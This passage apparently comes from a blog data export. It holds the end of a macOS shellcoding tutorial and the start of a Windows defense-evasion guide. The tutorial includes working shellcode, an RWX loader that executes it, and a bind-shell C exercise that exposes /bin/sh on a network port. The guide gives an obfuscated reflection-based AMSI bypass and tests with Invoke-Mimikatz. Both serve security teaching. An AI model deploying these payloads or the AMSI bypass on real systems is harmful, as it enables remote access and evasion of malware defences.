0x6e, 0x2f, 0x7a,</span><br><span class=\"line\">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class=\"line\">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class=\"line\">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class=\"line\">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class=\"line\">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class=\"line\">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class=\"line\">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int shellcode_bin_len = 93;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"otool\"><a href=\"#otool\" class=\"headerlink\" title=\"otool\"></a>otool</h2><ul>\n<li>Extract Raw Section Bytes</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \\</span><br><span class=\"line\">  | sed -n <span class=\"string\">&#x27;3,$p&#x27;</span> \\</span><br><span class=\"line\">  | awk <span class=\"string\">&#x27;&#123; for(i=2;i&lt;=NF;i++) printf &quot;%s&quot;,$i &#125; END&#123; print &quot;&quot; &#125;&#x27;</span> &gt; shellcode_otool.hex</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode_otool.hex </span><br><span class=\"line\">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert to binary <code>xxd</code></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -r -p shellcode_otool.hex &gt; shellcode_otool.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Check shellcode length</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">Shellcoding% <span class=\"built_in\">wc</span> -c shellcode_otool.bin</span><br><span class=\"line\">      93 shellcode_otool.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert it to <code>C</code> array</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">Shellcoding% <span class=\"built_in\">cat</span> shellcode_otool.h</span><br><span class=\"line\">unsigned char shellcode_otool_bin[] = &#123;</span><br><span class=\"line\">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,</span><br><span class=\"line\">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class=\"line\">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class=\"line\">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class=\"line\">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class=\"line\">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class=\"line\">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class=\"line\">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int shellcode_otool_bin_len = 93;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Test-Shellcode-with-Loader\"><a href=\"#Test-Shellcode-with-Loader\" class=\"headerlink\" title=\"Test Shellcode with Loader\"></a>Test Shellcode with Loader</h2><p>Now, let‚Äôs write a loader in <code>C</code> to try and execute our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> code[] = &#123;</span><br><span class=\"line\">      <span class=\"number\">0x48</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0xc9</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xba</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0x6e</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x7a</span>,</span><br><span class=\"line\">      <span class=\"number\">0x73</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe7</span>, <span class=\"number\">0xbb</span>, <span class=\"number\">0x2d</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x53</span>,</span><br><span class=\"line\">      <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe3</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0xe8</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x68</span>,</span><br><span class=\"line\">      <span class=\"number\">0x6f</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x22</span>,</span><br><span class=\"line\">      <span class=\"number\">0x20</span>, <span class=\"number\">0x3e</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x6d</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x2f</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x6e</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">      <span class=\"number\">0x64</span>, <span class=\"number\">0x2e</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xe6</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">      <span class=\"number\">0x31</span>, <span class=\"number\">0xd2</span>, <span class=\"number\">0xb8</span>, <span class=\"number\">0x3b</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x0f</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0xb8</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">      <span class=\"number\">0x00</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0xbf</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x0f</span>, <span class=\"number\">0x05</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len = <span class=\"keyword\">sizeof</span>(code);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid = fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;fork&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// child: allocate RWX, copy shellcode and execute</span></span><br><span class=\"line\">        <span class=\"type\">void</span> *exec = mmap(<span class=\"literal\">NULL</span>, len, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class=\"line\">                          MAP_ANON|MAP_PRIVATE, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (exec == MAP_FAILED) &#123;</span><br><span class=\"line\">            perror(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">            _exit(<span class=\"number\">127</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>(exec, code, len);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// print from child so you can see it if child doesn&#x27;t get replaced</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[child %d] executing shellcode (%zu bytes)...\\n&quot;</span>, getpid(), len);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">int</span> (*func)() = (<span class=\"type\">int</span>(*)())exec;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = func(); <span class=\"comment\">// if shellcode calls execve, child will be replaced</span></span><br><span class=\"line\">        <span class=\"comment\">// If returned, report and exit child</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[child %d] shellcode returned %d\\n&quot;</span>, getpid(), r);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        _exit(r &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// parent: wait for child and then check side-effect</span></span><br><span class=\"line\">        <span class=\"type\">int</span> status = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent %d] spawned child %d, waiting...\\n&quot;</span>, getpid(), pid);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (waitpid(pid, &amp;status, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">            perror(<span class=\"string\">&quot;waitpid&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (WIFEXITED(status)) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child exited with status %d\\n&quot;</span>, WEXITSTATUS(status));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child killed by signal %d\\n&quot;</span>, WTERMSIG(status));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] child ended with status 0x%x\\n&quot;</span>, status);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// small sleep to allow any async side-effects to settle</span></span><br><span class=\"line\">        usleep(<span class=\"number\">200000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">const</span> <span class=\"type\">char</span> *check_path = <span class=\"string\">&quot;/tmp/Pwned.txt&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (access(check_path, F_OK) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] Success: &#x27;%s&#x27; exists.\\n&quot;</span>, check_path);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[parent] Failure: &#x27;%s&#x27; not found (errno=%d: %s)\\n&quot;</span>,</span><br><span class=\"line\">                   check_path, errno, strerror(errno));</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>The loader‚Äôs job is simple: it stores raw machine-code bytes (the shellcode) in a C <code>unsigned char</code> array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call <code>execve</code>, <code>_exit</code>, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, <code>unsigned char code[] = &#123; ... &#125;;</code> places the bytes in the program‚Äôs data segment; <code>size_t len = sizeof(code);</code> computes the number of bytes to map and copy. The program then calls <code>mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)</code>. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; <code>NULL</code> lets the kernel choose the address, <code>len</code> is the requested size, and <code>MAP_ANON|MAP_PRIVATE</code> means the mapping is private and not backed by a file. If <code>mmap</code> fails (returns <code>MAP_FAILED</code>) the loader prints the error and exits. After a successful mapping the loader uses <code>memcpy(exec, code, len)</code> to place the shellcode bytes into the mapped pages, then casts the <code>void *</code> returned by <code>mmap</code> to a function pointer (<code>int (*func)() = (int(*)())exec;</code>) and calls <code>func()</code>. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‚Äëfacto technique used on <code>POSIX</code> systems for this purpose. What can happen when the call to <code>func()</code> executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes <code>execve()</code> successfully, the kernel replaces the entire process image with a new program, so none of the loader‚Äôs code after the call executes. If the shellcode calls <code>_exit()</code> or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program <code>fork()</code>, the child repeats the mapping, copy and invocation of the shellcode; any <code>execve</code> or <code>_exit</code> inside the child affects only the child. The parent calls <code>waitpid(child, &amp;status, 0)</code> to get the child‚Äôs exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example <code>/tmp/Pwned.txt</code>) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process ‚Äî the parent becomes the stable observer.</p>\n<ul>\n<li>Compile and Test the shellcode with the loader</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">zeyadazima.com% clang -o cloader cloader.c</span><br><span class=\"line\">zeyadazima.com% ./cloader </span><br><span class=\"line\">[parent <span class=\"number\">29373</span>] spawned child <span class=\"number\">29374</span>, waiting...</span><br><span class=\"line\">[child <span class=\"number\">29374</span>] executing <span class=\"title function_\">shellcode</span> <span class=\"params\">(<span class=\"number\">93</span> bytes)</span>...</span><br><span class=\"line\">[parent] child exited with status 0</span><br><span class=\"line\">[parent] Success: &#x27;/tmp/Pwned.txt&#x27; exists.</span><br></pre></td></tr></table></figure>\n\n<p>As we can see our shellcode executed successfully with no issues.</p>\n<h1 id=\"Exercises\"><a href=\"#Exercises\" class=\"headerlink\" title=\"Exercises\"></a>Exercises</h1><p>If you want to dive deeper more, you can do this exercise which is involving in creating a <code>BindShell</code> shellcode and execute it. </p>\n<p>Here all the things you need for the excersice:</p>\n<ul>\n<li>BindShell <code>C</code> code</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Source - https://stackoverflow.com/q</span></span><br><span class=\"line\"><span class=\"comment\">// Posted by gatorface, modified by community. See post &#x27;Timeline&#x27; for change history</span></span><br><span class=\"line\"><span class=\"comment\">// Retrieved 2025-11-10, License - CC BY-SA 3.0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Author:  Julien Ahrens (@MrTuxracer)</span></span><br><span class=\"line\"><span class=\"comment\">// Website:  http://www.rcesecurity.com </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i; <span class=\"comment\">// used for dup2 later</span></span><br><span class=\"line\">    <span class=\"type\">int</span> sockfd; <span class=\"comment\">// socket file descriptor</span></span><br><span class=\"line\">    <span class=\"type\">int</span> clientfd; <span class=\"comment\">// client file descriptor</span></span><br><span class=\"line\">    <span class=\"type\">socklen_t</span> socklen; <span class=\"comment\">// socket-length for new connections</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">srv_addr</span>;</span> <span class=\"comment\">// server aka listen address</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">cli_addr</span>;</span> <span class=\"comment\">// client address</span></span><br><span class=\"line\"></span><br><span class=\"line\">    srv_addr.sin_family = AF_INET; <span class=\"comment\">// server socket type address family = internet protocol address</span></span><br><span class=\"line\">    srv_addr.sin_port = htons( <span class=\"number\">1337</span> ); <span class=\"comment\">// server port, converted to network byte order</span></span><br><span class=\"line\">    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); <span class=\"comment\">// listen on any address, converted to network byte order</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// create new TCP socket</span></span><br><span class=\"line\">    sockfd = socket(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// bind socket</span></span><br><span class=\"line\">    bind( sockfd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;srv_addr, <span class=\"keyword\">sizeof</span>(srv_addr) );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// listen on socket</span></span><br><span class=\"line\">    listen(sockfd, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// accept new connections</span></span><br><span class=\"line\">    socklen = <span class=\"keyword\">sizeof</span>(cli_addr);</span><br><span class=\"line\">    clientfd = accept(sockfd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;cli_addr, &amp;socklen );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">2</span>; i++)</span><br><span class=\"line\">        dup2(clientfd, i);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// magic</span></span><br><span class=\"line\">    <span class=\"comment\">// execve( &quot;/bin/sh&quot;, NULL, NULL );</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//UPDATE: fixed exec call, shell still not returned to</span></span><br><span class=\"line\">    <span class=\"comment\">// client connecting with execl or proper execve</span></span><br><span class=\"line\">    execl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, (<span class=\"type\">char</span> *)<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Tasks:</p>\n<ul>\n<li>Use <code>execve()</code> instead of <code>execl</code></li>\n<li>Collect the syscall for <code>socket</code>,<code>bind</code>,<code>listen</code>,<code>accept</code> and <code>dup2</code>. As you will use it to build your <code>BindShell</code>.</li>\n<li>Study the functions arguments and get it ready for the functions&#x2F;syscalls</li>\n<li>Make sure to go around with the <code>struct</code>, Cause it‚Äôs similler to the way we built arrays</li>\n<li>Make sure to use the kernel source code to hop-around to find a variable value, like the <code>#define AF_INET</code> for example and explore the source code to help you creating your shellcode.</li>\n</ul>\n<h2 id=\"Help\"><a href=\"#Help\" class=\"headerlink\" title=\"Help ?\"></a>Help ?</h2><p>If you got any questions or need help, You can contact me:</p>\n<ul>\n<li><a href=\"https://www.linkedin.com/in/zer0verflow/\">Linkedin</a></li>\n<li><a href=\"https://x.com/AzimaZeyad\">Twitter&#x2F;X</a></li>\n<li>Email: <a href=\"mailto:&#x63;&#111;&#110;&#116;&#x61;&#99;&#x74;&#x40;&#x7a;&#101;&#121;&#97;&#100;&#x61;&#122;&#x69;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6d;\">contact@zeyadazima.com</a></li>\n<li>Discord: <code>.killer_1337</code> including <code>.</code></li>\n</ul>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>We explored the fundamentals of writing shellcode on <code>macOS</code> for the <code>x86_64</code> architecture. We set up a proper lab environment, understood the <code>XNU</code> kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow‚Äîstarting from <code>C</code> code, identifying syscalls, converting to assembly, and handling arguments‚Äîwe successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the <code>BSD</code> subsystem of <code>macOS</code>. This foundation sets the stage for more advanced topics.</p>\n<h1 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h1><ul>\n<li><a href=\"https://codebrowser.dev/\">https://codebrowser.dev/</a></li>\n<li><a href=\"https://man.freebsd.org/\">https://man.freebsd.org/</a></li>\n<li><a href=\"https://pubs.opengroup.org/\">https://pubs.opengroup.org</a></li>\n<li><a href=\"https://man7.org/linux/man-pages/\">https://man7.org/linux/man-pages/</a></li>\n<li><a href=\"https://opensource.apple.com/releases/\">https://opensource.apple.com/releases/</a></li>\n<li><a href=\"https://github.com/apple-oss-distributions/xnu\">https://github.com/apple-oss-distributions/xnu</a></li>\n<li><a href=\"https://xcodereleases.com/\">https://xcodereleases.com</a></li>\n<li><a href=\"https://newosxbook.com/\">https://newosxbook.com</a></li>\n</ul>\n"},{"title":"Windows Defense Evasion Guide","date":"2025-11-30T22:00:00.000Z","description":"In this blog post, I explored various Windows defensive mechanisms, configured them, and then demonstrated techniques to bypass them.","cover":"/images/site/posts/DefenseEvasion/Evasion.jpg","_content":"\n## Antimalware Scan Interface [ AMSI ]\n\nAntimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style=\"color:yellow\">signature-based scan of the content</span>.\n\nWindows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.\n\nSo how does AMSI work :\n\n* When AMSI is invoked, <span style=\"color:yellow\">AMSI.dll</span> is loaded into the application‚Äôs memory.\n* The key functions within AMSI.dll include `AmsiScanBuffer` and `AmsiInitialize`.\n* If the content is clear it will return 1 means the script will be executed\n\nLet's see :\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def.png\" alt=\"\"></figure>\n\n\nlet's see what Windows version is Copy\nthat is running and what antivirus software that is installed\n\n\n```powershell\nPS C:\\Users\\matio> Get-WmiObject Win32_OperatingSystem | Select PSComputerName, Caption, Version | fl\n\nPSComputerName : ATTACKER\nCaption        : Microsoft Windows 10 Pro\nVersion        : 10.0.19045\n\nPS C:\\Users\\matio> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct\n\ndisplayName              : Bitdefender Antivirus\ninstanceGuid             : {0F59B032-EA77-E3A8-2382-74A4346E5522}\npathToSignedProductExe   : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wscfix.exe\npathToSignedReportingExe : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wsccommunicator.exe\nproductState             : 266240\nPSComputerName           :\n\ndisplayName              : Windows Defender\ninstanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}\npathToSignedProductExe   : windowsdefender://\npathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exe\nproductState             : 393472\nPSComputerName           :\n```\n\nLet's test AMSI\n\n```powershell\nPS C:\\Users\\matio> Invoke-Mimikatz\nAt line:1 char:1\n+ Invoke-Mimikatz\n+ ~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n\nPS C:\\Users\\matio> \"Invoke\"+\"Mimikatz\"\nInvokeMimikatz\n```\n\nOkay AMSI works well let's try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]\n\n### Error Forcing\n\nError forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style=\"color:yellow\">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.\n\nLet's see an example , and break it into lines\n\n\n\n```powershell\n$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n$field = $assembly.GetField(('am{0}InitFailed' -f \n$c),'NonPublic,Static')\n$field.SetValue($null,$true)\n```\n\n* $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n\n\n```powershell\n$w = 'System.Management.Automation.A'\n$c = 'si'\n$m = 'Utils'\n```\n\nWe have 3 variables here $w , $c , $m if u combine them u will get `System.Management.Automation.AmsiUtils` but what is it ?\n\n`System.Management.Automation.AmsiUtils` is a class within the .NET framework that is part of the `System.Management.Automation` namespace.\n\nThe primary purpose of `System.Management.Automation.AmsiUtils` is to provide utilities for interacting with AMSI. <span style=\"color:yellow\">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.\n\n* $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n\nLet's see it in a good way without variables\n\n\n```powershell\n$assembly = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))\n```\n\nSo what does that mean ?\n\nIn the context of AMSI bypass techniques, obtaining the type information for `System.Management.Automation.AmsiUtils` is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using <span style=\"color:yellow\">reflection</span>, you can access and manipulate private and internal members of the class, such as the `amsiInitFailed` field.\n\nBut what is reflection ?\n\nReflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style=\"color:yellow\">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.\n\nLet's see an important screenshot\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def1.png\" alt=\"\"></figure>\n\n\nWhen you see this output, it means that 